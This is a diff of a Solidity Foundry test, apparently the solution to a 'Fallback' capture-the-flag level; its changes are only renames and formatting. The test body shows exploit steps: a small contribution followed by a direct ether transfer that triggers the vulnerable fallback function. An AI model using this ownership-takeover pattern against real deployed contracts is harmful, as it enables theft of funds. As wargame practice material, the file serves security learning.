@@ -5,7 +5,7 @@ import 'levels/FallbackFactory.sol';
 import 'levels/Fallback.sol';
 import 'utils/TestUtils.sol';
 
-contract TFallback is Test {
+contract FallbackTest is Test {
   address player;
   Utils utils;
   FallbackFactory fallbackFactory;
@@ -22,10 +22,10 @@ contract TFallback is Test {
 
   function testHack() public {
     vm.prank(player);
-    fallbackContract.contribute{value : 0.0001 ether}();
+    fallbackContract.contribute{value: 0.0001 ether}();
 
     vm.prank(player);
-    (bool sent,) = fallbackContractAddress.call{value: 1}("");
+    (bool sent,) = fallbackContractAddress.call{value: 1}('');
     assert(sent);
 
     vm.prank(player);
